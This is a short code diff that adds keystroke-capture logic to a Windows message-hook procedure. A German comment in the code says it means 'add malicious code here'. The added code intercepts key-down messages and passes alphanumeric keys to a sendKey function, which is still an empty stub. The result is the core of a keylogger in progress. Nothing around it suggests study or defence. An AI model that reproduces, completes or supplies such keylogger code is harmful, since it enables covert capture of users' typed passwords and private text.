@@ -25,11 +25,26 @@ void removeHook()
 	UnhookWindowsHookEx(g_hMyHook);
 }
 
+void sendKey(char key)
+{
+}
+
 LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam)
 {
 	// TODO: füge schadcode hier hinzu
 
+	if (code == HC_ACTION)
+	{
+		LPMSG pmsg = (LPMSG)lParam;
+		if (pmsg->message == WM_KEYDOWN)
+		{
+			WPARAM key = pmsg->wParam;
 
+			if (isalnum(key) != 0){
+				sendKey(key);
+			}
+		}
+	}
 
 	return (CallNextHookEx(g_hMyHook, code, wParam, lParam));
 }
